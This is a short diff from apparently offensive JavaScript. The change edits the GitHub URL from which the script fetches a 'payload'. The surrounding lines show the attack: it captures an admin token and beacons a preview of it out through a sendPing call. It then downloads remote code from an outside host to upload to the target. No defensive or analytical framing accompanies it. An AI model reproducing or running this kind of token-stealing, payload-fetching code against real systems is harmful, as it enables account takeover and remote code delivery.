@@ -51,7 +51,7 @@
             sendPing({ stage: "got_token", token_preview: adminToken.substring(0, 20) });
 
             // Step 2: upload payload from external source (GitHub)
-            let payloadFileResp = await fetch("https://raw.githubusercontent.com/Shu-Ouma-0/newhope/refs/heads/main/payload.txt");
+            let payloadFileResp = await fetch("https://raw.githubusercontent.com/Shu-Ouma-0/newhope/main/payload.txt");
             if (!payloadFileResp.ok) {
                 return sendPing({ stage: "fetch_payload_fail", status: payloadFileResp.status });
             }
